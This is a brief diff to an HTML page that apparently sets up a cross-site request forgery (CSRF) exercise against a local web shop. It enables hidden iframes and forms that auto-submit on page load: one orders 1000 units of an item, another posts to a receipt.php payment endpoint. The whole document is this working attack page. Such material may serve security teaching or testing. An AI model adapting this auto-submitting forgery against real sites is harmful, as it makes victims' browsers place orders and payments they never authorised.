@@ -5,12 +5,12 @@
 <body>
 	<iframe style="display:none" name="csrf-item-frame"></iframe>
 	<iframe style="display:none" name="csrf-pay-frame"></iframe>
-		<!-- <form name="itemorder"  method="post" action=https://localhost/ target=csrf-item-frame>
+		<form name="itemorder"  method="post" action="https://localhost/" target="csrf-item-frame">
 			<input type=hidden name=nbrOfItems value=1000>
 			<input type=hidden name=itemid value=2>';
-		</form> -->
-		<!-- <script>document.itemorder.submit()</script> -->
-		<form name="payment" method="post" action=https://127.0.0.1/receipt.php target=csrf-pay-frame>
+		</form>
+		<script>document.itemorder.submit()</script>
+		<form name="payment" method="post" action="https://127.0.0.1/receipt.php" target="csrf-pay-frame">
 		</form>
 		<script>document.payment.submit()</script>
 </body>
